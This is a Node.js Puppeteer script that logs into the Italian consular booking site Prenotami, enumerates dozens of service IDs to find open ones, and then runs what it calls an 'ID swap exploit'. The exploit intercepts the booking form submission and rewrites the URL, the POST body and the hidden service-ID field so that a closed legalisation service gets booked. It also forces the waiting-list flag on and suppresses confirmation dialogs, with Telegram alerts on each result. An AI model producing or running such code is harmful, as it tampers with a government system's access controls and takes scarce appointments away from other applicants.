#!/usr/bin/env node
// scan-services.js — Scan ALL Prenotami services and find open ones
// Then attempt ID swap exploit to book Legalizzazioni (2359)

require('dotenv').config();
const puppeteer = require('puppeteer-core');
const https = require('https');
const fs = require('fs');
const path = require('path');

const CONFIG = {
  email: process.env.PRENOTAMI_EMAIL,
  password: process.env.PRENOTAMI_PASSWORD,
  telegramBotToken: process.env.TELEGRAM_BOT_TOKEN,
  telegramChatId: process.env.TELEGRAM_CHAT_ID,
  targetServiceId: '2359', // Legalizzazioni
  // Known service IDs from Prenotami Tunisi — scan a wide range
  serviceIds: [
    // Common known ones
    1167, // Passaporti
    2356, 2357, 2358, 2359, 2360, 2361, 2362, 2363, 2364, 2365,
    // Extended range
    1100, 1101, 1102, 1103, 1104, 1105, 1110, 1115, 1120, 1150, 1160, 1165, 1168, 1169, 1170,
    1200, 1250, 1300, 1350, 1400, 1450, 1500,
    2300, 2310, 2320, 2330, 2340, 2350, 2351, 2352, 2353, 2354, 2355,
    2370, 2380, 2390, 2400, 2450, 2500,
    3000, 3100, 3200, 3300, 3400, 3500,
    4000, 4100, 4200, 4300, 4400, 4500,
    5000, 5100, 5111, 5200, 5300, 5400, 5500,
  ],
};

function log(type, msg) {
  const time = new Date().toLocaleString('en-GB', { timeZone: 'UTC' });
  const icons = { INFO: 'ℹ️', SUCCESS: '✅', ERROR: '❌', WARNING: '⚠️', SCAN: '🔍' };
  console.log(`[${time}] ${icons[type] || ''} ${type}: ${msg}`);
}

function sendTelegram(message) {
  return new Promise((resolve, reject) => {
    if (!CONFIG.telegramBotToken || !CONFIG.telegramChatId) { resolve(null); return; }
    const data = JSON.stringify({
      chat_id: CONFIG.telegramChatId,
      text: message,
      parse_mode: 'Markdown',
    });
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${CONFIG.telegramBotToken}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': data.length },
    }, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve(body));
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

async function main() {
  log('INFO', '='.repeat(60));
  log('INFO', '🔍 PRENOTAMI SERVICE SCANNER + ID SWAP EXPLOIT');
  log('INFO', `Target: Service ${CONFIG.targetServiceId} (Legalizzazioni)`);
  log('INFO', `Scanning ${CONFIG.serviceIds.length} service IDs...`);
  log('INFO', '='.repeat(60));

  const browser = await puppeteer.launch({
    executablePath: process.platform === 'win32'
      ? 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
      : '/usr/bin/google-chrome',
    headless: false,
    userDataDir: path.join(__dirname, 'chrome-profile'),
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--window-size=1280,900'],
  });

  const page = await browser.newPage();
  await page.setViewport({ width: 1280, height: 900 });

  // ======== LOGIN ========
  log('INFO', 'Logging in...');
  await page.goto('https://prenotami.esteri.it/Home', { waitUntil: 'networkidle2', timeout: 30000 });
  await new Promise(r => setTimeout(r, 2000));

  let url = page.url();
  let text = await page.evaluate(() => document.body.innerText);

  if (text.includes('Disconnetti') || text.includes('I miei appuntamenti')) {
    log('SUCCESS', 'Already logged in!');
  } else {
    // Click login link if on prenotami
    if (url.includes('prenotami.esteri.it')) {
      const loginClicked = await page.evaluate(() => {
        const links = document.querySelectorAll('a');
        for (const link of links) {
          if (link.href && link.href.includes('/Home') && link.innerText.includes('Accedi')) {
            link.click();
            return true;
          }
        }
        // Try direct link
        const loginBtn = document.querySelector('a[href*="Account"], a[href*="Login"], .login-link');
        if (loginBtn) { loginBtn.click(); return true; }
        return false;
      });
      if (loginClicked) {
        await new Promise(r => setTimeout(r, 3000));
        url = page.url();
      }
    }

    // SSO login
    if (url.includes('iam.esteri.it')) {
      log('INFO', 'On SSO page, entering credentials...');
      await page.waitForSelector('input[name="callback_1"], #idToken1, input[type="text"]', { timeout: 10000 });
      await new Promise(r => setTimeout(r, 1000));

      const emailField = await page.$('input[name="callback_1"]') || await page.$('#idToken1') || await page.$('input[type="text"]');
      const passField = await page.$('input[name="callback_2"]') || await page.$('#idToken2') || await page.$('input[type="password"]');

      if (emailField && passField) {
        await emailField.click({ clickCount: 3 });
        await emailField.type(CONFIG.email, { delay: 50 });
        await passField.click({ clickCount: 3 });
        await passField.type(CONFIG.password, { delay: 50 });

        await page.click('button[type="submit"], input[type="submit"], .btn-primary');
        await new Promise(r => setTimeout(r, 8000));
        url = page.url();
        text = await page.evaluate(() => document.body.innerText);
        if (text.includes('Disconnetti') || url.includes('UserArea')) {
          log('SUCCESS', 'Login successful!');
        } else {
          log('ERROR', 'Login may have failed. Continuing anyway...');
        }
      }
    }
  }

  // ======== STEP 1: First get the services list page to find ALL real service IDs ========
  log('INFO', 'Loading services list page...');
  await page.goto('https://prenotami.esteri.it/Services', { waitUntil: 'networkidle2', timeout: 30000 });
  await new Promise(r => setTimeout(r, 3000));

  // Extract all service IDs from the page
  const pageServiceIds = await page.evaluate(() => {
    const ids = new Set();
    // Find all links/buttons with Booking/XXXX
    document.querySelectorAll('a[href*="Booking/"], button[onclick*="Booking/"]').forEach(el => {
      const match = (el.href || el.getAttribute('onclick') || '').match(/Booking\/(\d+)/);
      if (match) ids.add(parseInt(match[1]));
    });
    // Also check all onclick attributes
    document.querySelectorAll('[onclick]').forEach(el => {
      const match = el.getAttribute('onclick').match(/Booking\/(\d+)/);
      if (match) ids.add(parseInt(match[1]));
    });
    return Array.from(ids);
  });

  log('INFO', `Found ${pageServiceIds.length} service IDs on /Services page: ${pageServiceIds.join(', ')}`);

  // Merge with our known list
  const allServiceIds = [...new Set([...pageServiceIds, ...CONFIG.serviceIds])].sort((a, b) => a - b);
  log('INFO', `Total unique service IDs to scan: ${allServiceIds.length}`);

  // Also save full page HTML for analysis
  const servicesHtml = await page.content();
  fs.writeFileSync(path.join(__dirname, 'services-list-latest.html'), servicesHtml);
  log('INFO', 'Saved services-list-latest.html');

  // Extract service names from the page
  const serviceInfo = await page.evaluate(() => {
    const info = [];
    // Look for service cards/rows
    document.querySelectorAll('.service-row, .card, tr, .row').forEach(el => {
      const text = el.innerText;
      const linkMatch = (el.innerHTML || '').match(/Booking\/(\d+)/);
      if (linkMatch && text.length > 5 && text.length < 500) {
        info.push({ id: parseInt(linkMatch[1]), text: text.substring(0, 200) });
      }
    });
    return info;
  });

  if (serviceInfo.length > 0) {
    log('INFO', '=== SERVICES ON PAGE ===');
    serviceInfo.forEach(s => log('INFO', `  Service ${s.id}: ${s.text.replace(/\n/g, ' | ')}`));
  }

  // ======== STEP 2: Scan each service ========
  const openServices = [];
  const closedServices = [];

  for (const svcId of allServiceIds) {
    log('SCAN', `Testing service ${svcId}...`);

    try {
      const response = await page.goto(`https://prenotami.esteri.it/Services/Booking/${svcId}`, {
        waitUntil: 'networkidle2',
        timeout: 15000,
      });
      await new Promise(r => setTimeout(r, 2000));

      const currentUrl = page.url();
      const pageText = await page.evaluate(() => document.body.innerText);
      const hasForm = await page.evaluate(() => !!document.getElementById('bookingForm'));
      const hasCalendar = await page.evaluate(() => !!document.querySelector('.datepicker, #calendar, .ui-datepicker, [data-date]'));
      const hasAvanti = await page.evaluate(() => !!document.getElementById('btnAvanti'));
      const serviceName = await page.evaluate(() => {
        const el = document.getElementById('ServizioDescrizione');
        return el ? el.innerText : '';
      });

      const isOpen = hasForm && currentUrl.includes(`Booking/${svcId}`);
      const isRedirected = currentUrl.includes('/Services') && !currentUrl.includes(`Booking/${svcId}`);
      const isEsauriti = pageText.includes('esauriti') || pageText.includes('Stante l');
      const isError = currentUrl.includes('/Error');

      if (isOpen) {
        log('SUCCESS', `🎯 SERVICE ${svcId} IS OPEN! Name: ${serviceName.substring(0, 100)}`);
        log('SUCCESS', `   URL: ${currentUrl}`);
        log('SUCCESS', `   Has form: ${hasForm}, Has calendar: ${hasCalendar}, Has AVANTI: ${hasAvanti}`);

        // Check for waiting list flag
        const wlEnabled = await page.evaluate(() => {
          const el = document.getElementById('isWaitingListEnabled');
          return el ? el.value : 'not found';
        });
        log('INFO', `   Waiting list: ${wlEnabled}`);

        openServices.push({
          id: svcId,
          name: serviceName,
          url: currentUrl,
          hasForm, hasCalendar, hasAvanti,
          waitingList: wlEnabled,
        });
      } else {
        const reason = isEsauriti ? 'ESAURITI' : isRedirected ? 'REDIRECTED' : isError ? 'ERROR' : 'UNKNOWN';
        closedServices.push({ id: svcId, reason });
        // Don't log each closed one to reduce noise — only log non-redirect ones
        if (!isRedirected) {
          log('INFO', `   Service ${svcId}: ${reason} (URL: ${currentUrl.substring(0, 60)})`);
        }
      }
    } catch (e) {
      log('WARNING', `Service ${svcId}: timeout or error — ${e.message.substring(0, 80)}`);
      closedServices.push({ id: svcId, reason: 'TIMEOUT' });
    }
  }

  // ======== RESULTS ========
  log('INFO', '='.repeat(60));
  log('INFO', '📊 SCAN RESULTS');
  log('INFO', `Open services: ${openServices.length}`);
  log('INFO', `Closed services: ${closedServices.length}`);

  if (openServices.length > 0) {
    log('SUCCESS', '=== OPEN SERVICES ===');
    openServices.forEach(s => {
      log('SUCCESS', `  🟢 ${s.id} — ${s.name.substring(0, 80)}`);
    });

    // Send Telegram notification
    const openList = openServices.map(s => `🟢 ${s.id}: ${s.name.substring(0, 60)}`).join('\n');
    await sendTelegram(
      `🔍 *SCAN PRENOTAMI TERMINÉ*\n\n` +
      `Services ouverts trouvés: ${openServices.length}\n\n${openList}\n\n` +
      `Tentative d'exploit ID Swap en cours...`
    );

    // ======== STEP 3: ID SWAP EXPLOIT ========
    const donor = openServices[0]; // Use first open service
    log('INFO', '='.repeat(60));
    log('INFO', `🎯 ID SWAP EXPLOIT — Using donor service ${donor.id} (${donor.name.substring(0, 50)})`);
    log('INFO', `Target: Service ${CONFIG.targetServiceId} (Legalizzazioni)`);
    log('INFO', '='.repeat(60));

    // Navigate to the donor service
    await page.goto(`https://prenotami.esteri.it/Services/Booking/${donor.id}`, {
      waitUntil: 'networkidle2',
      timeout: 20000,
    });
    await new Promise(r => setTimeout(r, 2000));

    // Enable request interception to swap the service ID on form submit
    await page.setRequestInterception(true);
    
    let intercepted = false;
    page.on('request', (request) => {
      if (request.isInterceptResolutionHandled()) return;

      // Intercept the POST to the booking form
      if (request.method() === 'POST' && request.url().includes('/Services/Booking/')) {
        const originalUrl = request.url();
        const newUrl = originalUrl.replace(`/Booking/${donor.id}`, `/Booking/${CONFIG.targetServiceId}`);
        
        // Also modify the POST body to swap service ID
        let postData = request.postData() || '';
        postData = postData.replace(`IDServizioErogato=${donor.id}`, `IDServizioErogato=${CONFIG.targetServiceId}`);
        // Also try URL-encoded
        postData = postData.replace(new RegExp(donor.id.toString(), 'g'), CONFIG.targetServiceId);

        log('SUCCESS', `🔄 INTERCEPTED! Swapping ${originalUrl} → ${newUrl}`);
        log('INFO', `   Post data (200 chars): ${postData.substring(0, 200)}`);
        intercepted = true;

        request.continue({
          url: newUrl,
          postData: postData,
          headers: {
            ...request.headers(),
            'Referer': `https://prenotami.esteri.it/Services/Booking/${CONFIG.targetServiceId}`,
          },
        });
      } else {
        request.continue();
      }
    });

    // Fill the form
    // Select booking type
    await page.evaluate(() => {
      const ddl = document.getElementById('typeofbookingddl');
      if (ddl) {
        for (let i = 0; i < ddl.options.length; i++) {
          if (ddl.options[i].value !== '0' && ddl.options[i].value !== '') {
            ddl.selectedIndex = i;
            ddl.dispatchEvent(new Event('change', { bubbles: true }));
            break;
          }
        }
      }
    });
    await new Promise(r => setTimeout(r, 1000));

    // Fill text fields
    await page.evaluate(() => {
      document.querySelectorAll('input[id*="DatiAddizionaliPrenotante"][type="text"]').forEach(input => {
        if (!input.value && input.offsetParent !== null) {
          input.value = 'N/A';
          input.dispatchEvent(new Event('change', { bubbles: true }));
        }
      });
      document.querySelectorAll('input[id*="DatiAddizionaliPrenotante"][type="date"]').forEach(input => {
        if (!input.value && input.offsetParent !== null) {
          const d = new Date(); d.setFullYear(d.getFullYear() + 2);
          input.value = d.toISOString().split('T')[0];
          input.dispatchEvent(new Event('change', { bubbles: true }));
        }
      });
      document.querySelectorAll('select[id*="ddls_"]').forEach(sel => {
        if (sel.selectedIndex === 0 && sel.offsetParent !== null) {
          for (let i = 1; i < sel.options.length; i++) {
            if (sel.options[i].value !== '0') {
              sel.selectedIndex = i;
              sel.dispatchEvent(new Event('change', { bubbles: true }));
              break;
            }
          }
        }
      });
      // Notes
      const notes = document.getElementById('BookingNotes');
      if (notes) notes.value = '';
      // Privacy
      const privacy = document.getElementById('PrivacyCheck');
      if (privacy && !privacy.checked) {
        privacy.checked = true;
        privacy.dispatchEvent(new Event('change', { bubbles: true }));
      }
    });

    // Also swap the hidden service ID field BEFORE submit
    await page.evaluate((targetId) => {
      const svcField = document.getElementById('IDServizioErogato');
      if (svcField) svcField.value = targetId;
      // Change form action
      const form = document.getElementById('bookingForm');
      if (form) form.action = `/Services/Booking/${targetId}`;
      // Enable waiting list
      const wl = document.getElementById('isWaitingListEnabled');
      if (wl) wl.value = 'True';
    }, CONFIG.targetServiceId);

    log('INFO', 'Form filled. Hidden fields swapped to target service.');

    // Take screenshot
    const screenshotDir = path.join(__dirname, 'screenshots');
    if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });
    await page.screenshot({ path: path.join(screenshotDir, `exploit-form-${Date.now()}.png`), fullPage: true });

    // Override confirm
    await page.evaluate(() => { window.confirm = () => true; });

    // Click AVANTI
    log('INFO', '🚀 Clicking AVANTI with ID swap active...');
    const navPromise = page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => null);
    await page.click('#btnAvanti');
    await new Promise(r => setTimeout(r, 3000));
    await navPromise;
    await new Promise(r => setTimeout(r, 3000));

    // Check result
    const afterUrl = page.url();
    const afterText = await page.evaluate(() => document.body.innerText);
    await page.screenshot({ path: path.join(screenshotDir, `exploit-result-${Date.now()}.png`), fullPage: true });

    log('INFO', `After exploit URL: ${afterUrl}`);
    log('INFO', `After exploit text (500 chars): ${afterText.substring(0, 500)}`);
    log('INFO', `Request was intercepted: ${intercepted}`);

    if (afterUrl.includes('/Error') || afterText.includes('errore')) {
      log('ERROR', '❌ Server rejected the swapped request.');
      await sendTelegram(`❌ *ID SWAP ÉCHOUÉ*\n\nLe serveur a rejeté la requête.\nURL: ${afterUrl}`);
    } else if (afterText.includes('OTP') || afterText.includes('otp')) {
      log('SUCCESS', '🔐 OTP STEP! The exploit worked — OTP required!');
      await sendTelegram(
        `🎯🔐 *ID SWAP RÉUSSI — OTP REQUIS!*\n\n` +
        `Le serveur a accepté le swap!\n` +
        `Vérifiez votre email MAINTENANT pour le code OTP!`
      );
      // Wait for OTP
      log('INFO', 'Waiting 5 minutes for OTP entry...');
      const deadline = Date.now() + 300000;
      while (Date.now() < deadline) {
        await new Promise(r => setTimeout(r, 10000));
        const t = await page.evaluate(() => document.body.innerText);
        if (t.includes('Conferma') || t.includes('confermato') || page.url().includes('/Reservation')) {
          log('SUCCESS', '🎉 BOOKING CONFIRMED!');
          await sendTelegram('🎉 *RENDEZ-VOUS CONFIRMÉ!*');
          break;
        }
      }
    } else if (afterText.includes('calendario') || afterText.includes('calendar') || afterText.includes('Seleziona')) {
      log('SUCCESS', '📅 CALENDAR PAGE! The exploit bypassed the block!');
      await sendTelegram(`📅 *CALENDRIER ACCESSIBLE!*\n\nL'exploit a fonctionné! Le calendrier est apparu!`);
      // Try to click first available date
      const dateClicked = await page.evaluate(() => {
        const days = document.querySelectorAll('td.day:not(.disabled), td a, .available');
        for (const d of days) {
          if (d.offsetParent !== null && !d.classList.contains('disabled')) {
            d.click();
            return d.innerText;
          }
        }
        return null;
      });
      if (dateClicked) log('SUCCESS', `Clicked date: ${dateClicked}`);
    } else {
      log('WARNING', 'Unclear result. Check screenshots.');
      await sendTelegram(`⚠️ *RÉSULTAT INCLAIR*\n\nURL: ${afterUrl}\nTexte: ${afterText.substring(0, 200)}`);
    }

  } else {
    log('ERROR', '❌ No open services found! All services are blocked.');
    await sendTelegram(
      `🔍 *SCAN PRENOTAMI TERMINÉ*\n\n` +
      `❌ AUCUN service ouvert trouvé!\n` +
      `Tous les ${closedServices.length} services sont fermés/esauriti.\n\n` +
      `Le bot continuera à surveiller...`
    );
  }

  // Save results
  const results = { timestamp: new Date().toISOString(), openServices, closedServices };
  fs.writeFileSync(path.join(__dirname, 'scan-results.json'), JSON.stringify(results, null, 2));
  log('INFO', 'Results saved to scan-results.json');

  await browser.close();
  log('INFO', 'Done!');
}

main().catch(err => {
  log('ERROR', `Fatal: ${err.message}`);
  process.exit(1);
});
